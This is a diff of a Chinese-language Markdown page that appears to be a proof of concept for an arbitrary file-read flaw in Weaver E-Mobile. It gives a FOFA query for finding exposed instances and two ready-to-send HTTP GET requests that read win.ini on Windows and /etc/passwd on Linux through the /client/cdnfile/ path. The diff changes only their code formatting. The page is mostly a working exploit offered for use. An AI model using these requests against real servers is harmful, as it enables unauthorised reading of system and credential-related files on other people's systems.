@@ -5,21 +5,25 @@
 `app="泛微-EMobile"`
 ***
 ### windows下执行
-`GET /client/cdnfile/1C/Windows/win.ini HTTP/1.1
+```javascript
+GET /client/cdnfile/1C/Windows/win.ini HTTP/1.1
 Host: your-ip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Connection: close`
+Connection: close
+```
 ![image](https://github.com/user-attachments/assets/dfc8f838-09ff-4fd5-9bfb-a96058e4cac3)
 
 ### linux下执行
-`GET /client/cdnfile/C/etc/passwd HTTP/1.1
+```javascript
+GET /client/cdnfile/C/etc/passwd HTTP/1.1
 Host: your-ip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Connection: close`
+Connection: close
+```
 ![image](https://github.com/user-attachments/assets/2f7e6688-aa3d-4ed5-81c8-4da7e2865fe2)
